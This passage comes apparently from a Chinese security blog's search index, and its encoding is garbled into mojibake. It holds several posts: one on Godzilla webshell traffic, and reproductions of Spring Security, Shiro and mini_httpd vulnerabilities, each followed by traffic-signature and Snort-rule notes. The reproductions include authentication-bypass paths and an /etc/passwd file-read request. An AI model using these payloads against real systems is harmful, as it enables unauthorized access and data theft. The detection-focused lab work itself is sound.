æœåŠ¡å™¨ç«¯è¿”å›ç»“æœè§£å¯†ï¼š å»æ‰å‰16ä½å’Œå16ä½çš„å†—ä½™æ•°æ®ï¼Œå°†ä¸­é—´çš„base64éƒ¨åˆ†è§£å¯†ï¼ˆä¸éœ€è¦å†è¿›è¡Œä¸€æ­¥urlè§£ç äº†ï¼‰ï¼Œå¯ä»¥å¾—åˆ°è¯¦ç»†çš„ä¿¡æ¯ğŸ‘‡ æŠ“åŒ…åˆ†æ-å…¶ä»–æ“ä½œæ•°æ®åŒ…æ‰§è¡Œå‘½ä»¤ è¿›å…¥shellä¹‹åæ‰§è¡Œå‘½ä»¤ ls æŠ“åŒ…ï¼šğŸ‘‡ï¼ˆäº§ç”Ÿä¸€ä¸ªæ•°æ®åŒ…ï¼‰ è§£ç ï¼ˆæœ‰ä¸€äº›requestçš„æ•°æ®åŒ…base64æœ‰ä¸€äº›å°é”™è¯¯ï¼Œè¾“å‡ºç»“æœåªéœ€è¦å†æŠŠä¸ªåˆ«éƒ¨åˆ†base64è§£ç ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚ï¼‰ requestè§£ç å†…å®¹ä¸ºï¼šcmdLine=ls&amp;methodName=execCommand æœåŠ¡å™¨å“åº”ç»“æœä¸ºlsæ‰§è¡Œåæ˜¾ç¤ºçš„å†…å®¹ğŸ‘‡ è§„åˆ™æå–æ€è·¯ é»˜è®¤çš„å¯†ç ä¸ºpassï¼Œå¯†é’¥ä¸ºkeyï¼Œå¯ä»¥å°†é»˜è®¤çš„å¯†ç ä½œä¸ºè§„åˆ™è¿›è¡Œç­›é€‰ã€‚ payload.phpæ–‡ä»¶å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼Œå…¶ä¸­å®šä¹‰äº†shellæ‰€æœ‰åŠŸèƒ½æ‰€éœ€çš„ä¸€ç³»åˆ—å‡½æ•°ï¼Œå“¥æ–¯æ‹‰ç¬¬ä¸€æ¬¡è¿æ¥shellæ—¶ï¼Œå°†è¿™äº›å‡½æ•°å®šä¹‰å‘é€ç»™æœåŠ¡å™¨å¹¶å­˜å‚¨åœ¨sessionä¸­ï¼Œåç»­çš„shellæ“ä½œåªéœ€è¦å‘é€å‡½æ•°åç§°ä»¥åŠå¯¹åº”çš„å‡½æ•°å‚æ•°å³å¯ã€‚ æ•°æ®åŒ…è¯·æ±‚ä¼šæœ‰è¯¥æµé‡ç‰¹å¾ï¼špass=methodName=â€˜å‡½æ•°åâ€™ 123456789101112131415161718192021runbypass_open_basedirformatParameterevalFuncdeleteDirdeleteFilecopyFilemoveFilegetBasicsInfogetFilereadFileContentuploadFilenewDirnewFileexecCommandexecSqlbase64EncodetestgetincludeCodebase64Decode é»˜è®¤å¯†é’¥keyå¸¦æ¥çš„ç¬¬ä¸€ä¸ªè¯·æ±‚åŒ…ï¼ŒåŒ…å«ç‰¹å¾AQQWDQ== å‚è€ƒæ–‡ç« https://www.colasoft.com.cn/news/20220523.php https://www.freebuf.com/sectool/285693.html","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"æµé‡åˆ†æ","slug":"Webå®‰å…¨/æµé‡åˆ†æ","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"Godzilla","slug":"Godzilla","permalink":"https://gryffinbit.top/tags/Godzilla/"}],"author":"Gryffinbit"},{"title":"Spring-security è®¤è¯ç»•è¿‡æ¼æ´å¤ç°åŠæµé‡åˆ†æï¼ˆCVE-2022-22978ï¼‰","slug":"Spring-security-è®¤è¯ç»•è¿‡æ¼æ´å¤ç°åŠæµé‡åˆ†æï¼ˆCVE-2022-22978ï¼‰","date":"2022-12-12T10:46:44.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/12/12/Spring-security-è®¤è¯ç»•è¿‡æ¼æ´å¤ç°åŠæµé‡åˆ†æï¼ˆCVE-2022-22978ï¼‰/","permalink":"https://gryffinbit.top/2022/12/12/Spring-security-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-22978%EF%BC%89/","excerpt":"","text":"æ¼æ´è¯¦æƒ…æ¼æ´æè¿°å½“Spring-securityä½¿ç”¨ RegexRequestMatcher è¿›è¡Œæƒé™é…ç½®ï¼Œç”±äºRegexRequestMatcheræ­£åˆ™è¡¨è¾¾å¼é…ç½®æƒé™çš„ç‰¹æ€§ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¸­åŒ…å«â€œ.â€æ—¶ï¼Œæœªç»èº«ä»½éªŒè¯æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„æ•°æ®åŒ…ç»•è¿‡èº«ä»½è®¤è¯ã€‚ å½±å“ç‰ˆæœ¬ï¼š Spring Security 5.5.x &lt; 5.5.7 Spring Security 5.6.x &lt; 5.6.4 æ¼æ´åŸç†åœ¨è®¿é—®&#x2F;admin&#x2F;{name}æ¥å£æ—¶ï¼Œéœ€è¦è®¤è¯æ‰èƒ½è®¿é—®ã€‚å½“è®¤è¯æ¥å£ä½¿ç”¨getRequestURI()æˆ–getRequestURL()å‡½æ•°æ¥è§£æç”¨æˆ·è¯·æ±‚çš„URLæ—¶ï¼Œè‹¥URLä¸­åŒ…å«äº†ä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œå¦‚åˆ†å·ï¼›å°±å¯èƒ½äº§ç”Ÿé™åˆ¶ç»•è¿‡ã€‚è€Œåœ¨spring-securityä¸­ï¼Œå­˜åœ¨StrictHttpfirewallæœºåˆ¶é»˜è®¤å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥ä½¿ç”¨&#x2F;admin&#x2F;..;&#x2F;1è¿™ç§æ–¹å¼ä¹Ÿå°±æ— æ³•ç»•è¿‡ã€‚ ä½†æ˜¯åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­å…ƒå­—ç¬¦â€œ.â€æ˜¯åŒ¹é…é™¤æ¢è¡Œç¬¦ï¼ˆ\\nã€\\rï¼‰ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ï¼Œåœ¨javaä¸­çš„æ­£åˆ™é»˜è®¤æƒ…å†µä¸‹â€œ.â€ä¹ŸåŒæ ·ä¸ä¼šåŒ…å«\\nã€\\rå­—ç¬¦ï¼Œæ‰€ä»¥RegexRequestMatcheråœ¨è¿›è¡Œæ­£åˆ™åŒ¹é…æ—¶ä¸ä¼šå¤„ç†\\nã€\\r åœ¨spring-securityä¸­åˆ©ç”¨æ¢è¡Œç¬¦å¯å®ç°æƒé™è®¤è¯è¿›è¡Œç»•è¿‡ï¼Œ\\rçš„URlç¼–ç ä¸º%0dï¼Œ\\nçš„URLç¼–ç ä¸º%0a æ¼æ´å¤ç°é¶åœº12docker pull s0cke3t/cve-2022-22978:latestdocker run -d -p 8080:8080 s0cke3t/cve-2022-22978:latest è®¿é—®&#x2F;admin&#x2F;xxxä¼šè·³è½¬è‡³ç™»é™†é¡µé¢è¿›è¡Œæƒé™éªŒè¯ã€‚ æ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯ç”±äºæ­£åˆ™å‘ç”Ÿäº†é—®é¢˜ï¼Œå¯ä»¥é€šè¿‡åœ¨ URL ä¸­åŠ å…¥æ¢è¡Œç¬¦ï¼ˆ r æˆ– n ï¼‰æ¥ç»•è¿‡ã€‚ï¼ˆ\\rçš„urlç¼–ç ä¸º%0dï¼Œ\\nçš„urlç¼–ç ä¸º%0aï¼‰ ä½¿ç”¨/admin/%0dtest æˆ–è€… /admin/%0atestæˆåŠŸç»•è¿‡ç™»é™†è®¤è¯ã€‚ æµé‡åˆ†æ/admin/%0d æˆ–è€… /admin/%0a æ˜¯ç‰¹å¾æµé‡ã€‚ è§„åˆ™ç¼–å†™æ—¶ï¼Œé€‰æ‹©å‚æ•°nocase ä½¿ç”¨ nocase å…³é”®å­—ï¼Œè§„åˆ™ç¼–å†™è€…å¯ä»¥æŒ‡å®š Snort åº”è¯¥æŸ¥æ‰¾ç‰¹å®šçš„æ¨¡å¼ï¼Œè€Œå¿½ç•¥å¤§å°å†™ã€‚nocase ä¿®æ”¹è§„åˆ™ä¸­çš„ä¸Šä¸€ä¸ª content å…³é”®å­—ã€‚ ä¾‹å­ 1alert tcp any any -&gt; any 21 (msg:&quot;FTP ROOT&quot;; content:&quot;USER root&quot;; nocase;)","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://gryffinbit.top/tags/Spring/"}],"author":"Gryffinbit"},{"title":"Shiroè®¤è¯ç»•è¿‡æ¼æ´å¤ç°ï¼ˆCVE-2020-1957ï¼‰","slug":"Shiroè®¤è¯ç»•è¿‡æ¼æ´å¤ç°ï¼ˆCVE-2020-1957ï¼‰","date":"2022-12-05T10:43:31.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/12/05/Shiroè®¤è¯ç»•è¿‡æ¼æ´å¤ç°ï¼ˆCVE-2020-1957ï¼‰/","permalink":"https://gryffinbit.top/2022/12/05/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2020-1957%EF%BC%89/","excerpt":"","text":"æ¼æ´è¯¦æƒ…Shiroç»„ä»¶Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œæ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚ä½¿ç”¨Shiroçš„æ˜“äºç†è§£çš„API,å¯ä»¥å¿«é€Ÿã€è½»æ¾åœ°è·å¾—ä»»ä½•åº”ç”¨ç¨‹åº,ä»æœ€å°çš„ç§»åŠ¨åº”ç”¨ç¨‹åºåˆ°æœ€å¤§çš„ç½‘ç»œå’Œä¼ä¸šåº”ç”¨ç¨‹åºã€‚å†…ç½®äº†å¯ä»¥è¿æ¥å¤§é‡å®‰å…¨æ•°æ®æºï¼ˆåˆåç›®å½•ï¼‰çš„Realmï¼Œå¦‚LDAPã€å…³ç³»æ•°æ®åº“ï¼ˆJDBCï¼‰ã€ç±»ä¼¼INIçš„æ–‡æœ¬é…ç½®èµ„æºä»¥åŠå±æ€§æ–‡ä»¶ç­‰ã€‚ æ¼æ´æè¿°Apache Shiro 1.5.2ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œç”±äºShiroæ‹¦æˆªå™¨å’ŒrequestURIçš„åŒ¹é…æµç¨‹ä¸Webæ¡†æ¶çš„æ‹¦æˆªå™¨çš„åŒ¹é…æµç¨‹æœ‰å·®å¼‚ï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„httpè¯·æ±‚ï¼Œå¯ä»¥ç»•è¿‡Shiroçš„è®¤è¯ï¼Œæœªæˆæƒè®¿é—®æ•æ„Ÿè·¯å¾„ã€‚ æ­¤æ¼æ´æœ‰ä¸¤ç§æ”»å‡»æ–¹å¼ï¼š ç¬¬ä¸€ç§æ”»å‡»æ–¹å¼é€‚ç”¨äºShiro &lt; 1.5.0ç‰ˆæœ¬ã€‚ ç”±äºShiro 1.5.0ç‰ˆæœ¬ä¿®å¤è¡¥ä¸è€ƒè™‘ä¸å…¨é¢ï¼Œå¯¼è‡´è¡¥ä¸ç»•è¿‡ï¼Œå‡ºç°äº†ç¬¬äºŒç§æ”»å‡»æ–¹å¼ï¼Œé€‚ç”¨äºShiro &lt; 1.5.2ç‰ˆæœ¬ã€‚ æ¼æ´åˆ†æShiro 1.4.2 -&gt; 1.5.0 ç‰ˆæœ¬è¡¥ä¸åˆ†æå¯¹æ¯”Shiro 1.4.2ä¸Shiro 1.5.0ç‰ˆæœ¬çš„æ”¹åŠ¨ï¼ŒShiroåœ¨org.apache.shiro.web.filter.PathMatchingFilterç±»ä¸­æ·»åŠ äº†åˆ é™¤requestURIç»“å°¾çš„/çš„ä»£ç ã€‚ Shiro 1.4.2 ä»£ç åˆ†æä¼ å…¥çš„payloadé¦–å…ˆè¢«æœåŠ¡å™¨æ¥æ”¶ï¼Œå¹¶ä¼ é€ç»™Shiroæ‹¦æˆªå™¨å¤„ç†(org.apache.shiro.web.servlet.OncePerRequestFilter#doFilteræ–¹æ³•ä½œä¸ºå…¥å£)ã€‚ è°ƒç”¨createSubjectæ–¹æ³•åˆ›å»ºSubjectï¼Œå¹¶è°ƒç”¨executeæ–¹æ³•è¿›å…¥Shiro FilterChainä¸­ã€‚ è¿›å…¥org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver# getChainæ–¹æ³•ä¸­ï¼Œé¦–å…ˆè·å–è¯·æ±‚URIè·¯å¾„ï¼Œä¹‹åè¿­ä»£è·å–æ‹¦æˆªå™¨çš„è¡¨è¾¾å¼ã€‚ è¿™é‡Œé‡ç‚¹å…³æ³¨&#x2F;hello&#x2F;*è¡¨è¾¾å¼ã€‚ä»£ç è¿›å…¥pathMatchesæ–¹æ³•ï¼Œæœ€ç»ˆè°ƒç”¨org.apache.shiro.util.AntPathMatcher#doMatchæ–¹æ³•è¿›è¡Œä¼ å…¥çš„requestURIä¸æ‹¦æˆªå™¨è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚ åŒ¹é…è¿‡ç¨‹ä¸­ï¼Œåˆ†åˆ«å°†æ‹¦æˆªå™¨è¡¨è¾¾å¼ä¸requestURIä»¥&#x2F;ä½œä¸ºåˆ†éš”ç¬¦è¿›è¡Œå­—ç¬¦ä¸²åˆ°æ•°ç»„çš„è½¬æ¢ï¼Œé€šè¿‡å¾ªç¯åŒ¹é…æ•°ç»„ä¸­å¯¹åº”çš„å…ƒç´ ï¼Œåˆ¤æ–­requestURIæ˜¯å¦ç¬¦åˆæ‹¦æˆªå™¨è¡¨è¾¾å¼åŒ¹é…å½¢å¼ã€‚ å¦‚æœè¡¨è¾¾å¼ä¸­å­˜åœ¨é€šé…ç¬¦*ï¼Œä¼šå°†containsStaræ ‡å¿—ä½èµ‹å€¼ä¸ºtrueï¼Œè¿›å…¥ else if (patIdxEnd &#x3D;&#x3D; 0)åˆ¤æ–­æ¡ä»¶ï¼Œè¿”å›trueã€‚ ç»§ç»­è·Ÿè¿›ä»£ç ï¼Œåœ¨requestURIä¸æ‹¦æˆªå™¨è¡¨è¾¾å¼åŒ¹é…ç»“æŸåï¼Œè¿˜ä¼šè¿›è¡Œä¸€æ¬¡åˆ¤æ–­ï¼Œè€Œæ¼æ´äº§ç”Ÿçš„åŸå› ä¹Ÿæ˜¯ç”±äºåˆ¤æ–­çš„æ¡ä»¶ã€‚å¦‚æœShiroæ‹¦æˆªå™¨è¡¨è¾¾å¼ä¸ä»¥&#x2F;ç»“å°¾ï¼Œä¸”requestURIä»¥&#x2F;ç»“å°¾ï¼Œåˆ¤æ–­ä»£ç å°†è¿”å›falseè¡¨ç¤ºåŒ¹é…å¤±è´¥ï¼Œä»è€Œç»•è¿‡Shiroè®¤è¯ è·Ÿè¿›åˆ°Springå¤„ç†URIçš„ä»£ç ï¼Œè¿›å…¥org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternalæ–¹æ³•ï¼Œè·å–requestURIã€‚ è¿›å…¥lookupHandlerMethodæ–¹æ³•ï¼Œè°ƒç”¨addMatchingMappingsæ–¹æ³•ï¼Œè·å–Springæ‹¦æˆªå™¨ã€‚ è¿›å…¥org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingConditionæ–¹æ³•è¿›è¡Œè°ƒç”¨doMatchæ–¹æ³•è¿›è¡ŒrequestURIå’Œæ‹¦æˆªå™¨è¡¨è¾¾å¼çš„åŒ¹é…ã€‚ Springæ‹¦æˆªå™¨åŒ¹é…æµç¨‹å’ŒShiroå¤§è‡´ç›¸åŒï¼Œéƒ½æ˜¯å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°ç»„è¿›è¡ŒåŒ¹é…ã€‚ ç”±äºSpringå¤šäº†ä¸€ä¸ªç¯èŠ‚ï¼Œåœ¨æ£€æµ‹æ‹¦æˆªå™¨è¡¨è¾¾å¼ä¸requestURIç»“å°¾æ˜¯å¦ä¸º&#x2F;ä¹‹åï¼Œå¹¶æ²¡æœ‰ç›´æ¥è¿”å›falseã€‚è€Œæ˜¯å°†æ‹¦æˆªå™¨è¡¨è¾¾å¼ç»“å°¾æ·»åŠ &#x2F;ï¼Œå¹¶ç»§ç»­è¿›è¡Œ path.startsWith(this.pathSeparator) !&#x3D; pattern.startsWith(this.pathSeparator) æµ‹è¯•ï¼Œä»è€Œå®Œæˆäº†æ‹¦æˆªå™¨è¡¨è¾¾å¼ä¸requestURIçš„åŒ¹é…ã€‚ Shiro 1.5.1 -&gt; 1.5.2 ç‰ˆæœ¬è¡¥ä¸åˆ†æå¯¹æ¯”Shiro 1.5.1ä¸Shiro 1.5.2ç‰ˆæœ¬çš„æ”¹åŠ¨ Shiro 1.5.2ç‰ˆæœ¬ä¸­ï¼Œåœ¨è¿›è¡ŒdecodeAndCleanUriStringæ–¹æ³•ä¹‹å‰ä¼šå…ˆè¿›è¡ŒURIè§£æï¼Œè°ƒç”¨request.getServletPath()å’Œrequest.getPathInfo()è·å–ServletPathå’ŒPathInfoå¹¶è¿›è¡Œè·¯å¾„æ‹¼æ¥ã€‚ *Shiro 1.5.1ä»£ç åˆ†æ* Shiro 1.5.0 - 1.5.1åœ¨è®¤è¯è¿‡ç¨‹ä¸­åŸºæœ¬æ²¡æœ‰å˜åŒ–ï¼Œä¸»è¦åˆ†æä¸€ä¸‹äºŒæ¬¡ç»•è¿‡çš„åˆ©ç”¨ç‚¹ã€‚è¿˜æ˜¯ä»¥org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChainä½œä¸ºèµ·ç‚¹ã€‚ åœ¨è·å–requestURIæ—¶,ä¾æ—§ä¼šåœ¨getPathWithinApplicationæ–¹æ³•ä¸­è°ƒç”¨getRequestUriæ–¹æ³•è¿›è¡ŒrequestURIçš„è§£æå¹¶è·å–ï¼Œä½†æ˜¯åœ¨URIæ­£è§„åŒ–å¤„ç†æ—¶ï¼Œå…ˆè°ƒç”¨decodeAndCleanUriStringæ–¹æ³•è¿›è¡Œè·¯å¾„çš„è§£ç ï¼Œå¹¶æ¸…ç†URIã€‚ è¿›å…¥decodeAndCleanUriStringæ–¹æ³•ï¼Œå‘ç°æ­¤æ–¹æ³•ä¼šä»¥åˆ†å·å°†ä¼ å…¥çš„URIè¿›è¡Œæˆªæ–­ï¼Œå¹¶å°†åˆ†å·ä»¥åŠåˆ†å·åé¢çš„æ•°æ®è¿›è¡Œæ¸…ç©ºï¼Œè¿”å›åˆ†å·å‰é¢çš„URIæ•°æ®ï¼Œä»è€Œè®©&#x2F;a&#x2F;b;&#x2F;cå˜ä¸º&#x2F;a&#x2F;bã€‚ ç»§ç»­è·Ÿè¿›åˆ°Springæ‹¦æˆªå™¨çš„decodeAndCleanUriStringæ–¹æ³•ä¸­ã€‚ ä»ä»£ç ä¸­å¯ä»¥å‘ç°ï¼ŒSpringå¯¹äºåˆ†å·çš„å¤„ç†æ–¹å¼ä¸Shiroä¸åŒï¼ŒSpringä¼šå…ˆè·å–åˆ†å·çš„ä½ç½®ï¼Œå¹¶æ£€æµ‹åˆ†å·åæ˜¯å¦å­˜åœ¨&#x2F;ï¼Œå¦‚æœæœ‰ï¼Œå°†&#x2F;çš„ä½ç½®è®°å½•åœ¨slashIndexå˜é‡ä¸­ï¼Œå¹¶å°†åˆ†å·å‰çš„æ•°æ®ä¸&#x2F;ä¹‹åçš„æ•°æ®è¿›è¡Œæ‹¼æ¥ï¼Œä»è€Œè®©&#x2F;a&#x2F;b;&#x2F;cå˜ä¸º&#x2F;a&#x2F;b&#x2F;cã€‚è¿”å›å¤„ç†åçš„requestURIã€‚ ç”±äºSpringä¸Shiroçš„decodeAndCleanUriStringæ–¹æ³•ä¸åŒï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨åˆ†å·æ„é€ è·¯å¾„ï¼Œç»•è¿‡Shiroè®¤è¯ï¼Œå¹¶å¯ä»¥åŒ¹é…Springçš„åŠ¨æ€æ§åˆ¶å™¨ã€‚ å½“Shiro çš„Antæ ¼å¼çš„pathPattern ä¸­çš„çš„é€šé…ç¬¦æ˜¯ä¸æ”¯æŒåŒ¹é…è·¯å¾„çš„ï¼Œæ‰€ä»¥&#x2F;hello&#x2F; ä¸èƒ½æˆåŠŸåŒ¹é…&#x2F;hello&#x2F;1&#x2F; ï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘authcæ‹¦æˆªå™¨è¿›è¡Œæƒé™æ‹¦æˆªã€‚ä»è€ŒæˆåŠŸç»•è¿‡äº†Shiroæ‹¦æˆªå™¨ï¼Œè€Œåå†è¿›å…¥åˆ°springæ‹¦æˆªå™¨ä¸­ï¼Œ&#x2F;hello&#x2F;1&#x2F;ä¸&#x2F;hello&#x2F;1èƒ½è·å–åˆ°ç›¸åŒçš„èµ„æºã€‚ æ¼æ´å¤ç°ç›´æ¥è¯·æ±‚ç®¡ç†é¡µé¢/admin/ï¼Œæ— æ³•è®¿é—®ï¼Œå°†ä¼šè¢«é‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼š æ„é€ æ¶æ„è¯·æ±‚/xxx/..;/admin/ï¼Œå³å¯ç»•è¿‡æƒé™æ ¡éªŒï¼Œè®¿é—®åˆ°ç®¡ç†é¡µé¢ï¼š å‚è€ƒæ–‡ç« https://www.freebuf.com/vuls/249112.html","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Shiro","slug":"Shiro","permalink":"https://gryffinbit.top/tags/Shiro/"}],"author":"Gryffinbit"},{"title":"mini_httpdä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¤ç°åŠç‰¹å¾æµé‡åˆ†æï¼ˆCVE-2018-18778ï¼‰","slug":"mini-httpdä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¤ç°åŠç‰¹å¾æµé‡åˆ†æï¼ˆCVE-2018-18778ï¼‰","date":"2022-11-30T10:55:26.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/11/30/mini-httpdä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¤ç°åŠç‰¹å¾æµé‡åˆ†æï¼ˆCVE-2018-18778ï¼‰/","permalink":"https://gryffinbit.top/2022/11/30/mini-httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%89%B9%E5%BE%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88CVE-2018-18778%EF%BC%89/","excerpt":"","text":"æ¼æ´è¯¦æƒ…Mini_httpd æ˜¯ä¸€ä¸ªå¾®å‹çš„ Http æœåŠ¡å™¨ï¼Œåœ¨å ç”¨ç³»ç»Ÿèµ„æºè¾ƒå°çš„æƒ…å†µä¸‹å¯ä»¥ä¿æŒä¸€å®šç¨‹åº¦çš„æ€§èƒ½ï¼ˆçº¦ä¸º Apache çš„ 90%ï¼‰ï¼Œå› æ­¤å¹¿æ³›è¢«å„ç±» IOTï¼ˆè·¯ç”±å™¨ï¼Œäº¤æ¢å™¨ï¼Œæ‘„åƒå¤´ç­‰ï¼‰ä½œä¸ºåµŒå…¥å¼æœåŠ¡å™¨ã€‚è€ŒåŒ…æ‹¬åä¸ºï¼Œzyxelï¼Œæµ·åº·å¨è§†ï¼Œæ ‘è“æ´¾ç­‰åœ¨å†…çš„å‚å•†çš„æ——ä¸‹è®¾å¤‡éƒ½æ›¾é‡‡ç”¨ Mini_httpd ç»„ä»¶ã€‚ æ¼æ´åŸç†åœ¨ mini_httpd å¼€å¯è™šæ‹Ÿä¸»æœºæ¨¡å¼çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·è¯·æ±‚ http://HOST/FILE å°†ä¼šè®¿é—®åˆ°å½“å‰ç›®å½•ä¸‹çš„ HOST/FILE æ–‡ä»¶ã€‚ 1(void) snprintf( vfile, sizeof(vfile), &quot;%s/%s&quot;, req_hostname, f ); å½“ HOST=example.comã€FILE=index.html çš„æ—¶å€™ï¼Œä¸Šè¿°è¯­å¥ç»“æœä¸ºexample.com/index.htmlï¼Œæ–‡ä»¶æ­£å¸¸è¯»å–ã€‚å½“ HOST ä¸ºç©ºã€FILE=etc/passwd çš„æ—¶å€™ï¼Œä¸Šè¿°è¯­å¥ç»“æœä¸º /etc/passwdã€‚åè€…è¢«ä½œä¸ºç»å¯¹è·¯å¾„ï¼Œäºæ˜¯è¯»å–åˆ°äº† &#x2F;etc&#x2F;passwdï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚ æ¼æ´å¤ç°1cd Tools/vulhub/mini_httpd/CVE-2018-18778 è®¿é—® http://ip:8080 ä»»æ„æ–‡ä»¶è¯»å– BPæŠ“åŒ…å»æ‰hostï¼Œ&#x2F;etc&#x2F;passwdå¯æ¢æˆä»»æ„æ–‡ä»¶åï¼Œå³å¯ä»»æ„æ–‡ä»¶è¯»å– è§„åˆ™é˜²èŒƒæ²¡æœ‰ç‰¹å¾æµé‡å¯ä»¥åˆ†æï¼Œå¯ä»¥é‡‡ç”¨ç¦æ­¢è®¿é—®æ•æ„Ÿè·¯å¾„çš„æ–¹å¼ï¼Œè¿›è¡Œé˜²èŒƒ 12# è´¦æˆ·ä¿¡æ¯/etc/passwd è§„åˆ™ç¼–å†™ã€‚å¯ä»¥é‡‡ç”¨http_method å¯¹GETè¿›è¡Œè¿‡æ»¤ã€‚ å‚è€ƒæ–‡ç« https://www.wangan.com/docs/382","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"mini_httpd","slug":"mini-httpd","permalink":"https://gryffinbit.top/tags/mini-httpd/"}],"author":"Gryffinbit"},{"title":"Log4jååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-5645ï¼‰","slug":"Log4jååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-5645ï¼‰","date":"2022-11-29T16:20:56.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/11/30/Log4jååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-5645ï¼‰/","permalink":"https://gryffinbit.top/2022/11/30/Log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-5645%EF%BC%89/","excerpt":"","text":"æ¼æ´è¯¦æƒ…Apache Log4jæ˜¯ä¸€ä¸ªç”¨äºJavaçš„æ—¥å¿—è®°å½•åº“ï¼Œå…¶æ”¯æŒå¯åŠ¨è¿œç¨‹æ—¥å¿—æœåŠ¡å™¨ã€‚Apache Log4j 2.8.2ä¹‹å‰çš„2.xç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€‚ åœ¨åº”ç”¨ç¨‹åºä¸­æ·»åŠ æ—¥å¿—è®°å½•æœ€æ™®é€šçš„åšæ³•å°±æ˜¯åœ¨ä»£ç ä¸­åµŒå…¥è®¸å¤šçš„æ‰“å°è¯­å¥ï¼Œè¿™äº›æ‰“å°è¯­å¥å¯ä»¥è¾“å‡ºåˆ°æ§åˆ¶å°æˆ–æ–‡ä»¶ä¸­ï¼Œæ¯”è¾ƒå¥½çš„åšæ³•å°±æ˜¯æ„é€ ä¸€ä¸ªæ—¥å¿—æ“ä½œç±»æ¥å°è£…æ­¤ç±»æ“ä½œï¼Œè€Œä¸æ˜¯è®©ä¸€ç³»åˆ—çš„æ‰“å°è¯­å¥å……æ–¥äº†ä»£ç çš„ä¸»ä½“ã€‚ Log4jæ˜¯Apacheçš„ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œé€šè¿‡ä½¿ç”¨Log4jï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯è¾“é€çš„ç›®çš„åœ°æ˜¯æ§åˆ¶å°ã€æ–‡ä»¶ã€GUIç»„ä»¶ï¼Œç”šè‡³æ˜¯å¥—æ¥å£æœåŠ¡å™¨ã€NTçš„äº‹ä»¶è®°å½•å™¨ã€UNIX Syslogå®ˆæŠ¤è¿›ç¨‹ç­‰ï¼›æˆ‘ä»¬ä¹Ÿå¯ä»¥æ§åˆ¶æ¯ä¸€æ¡æ—¥å¿—çš„è¾“å‡ºæ ¼å¼ï¼›é€šè¿‡å®šä¹‰æ¯ä¸€æ¡æ—¥å¿—ä¿¡æ¯çš„çº§åˆ«ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ›´åŠ 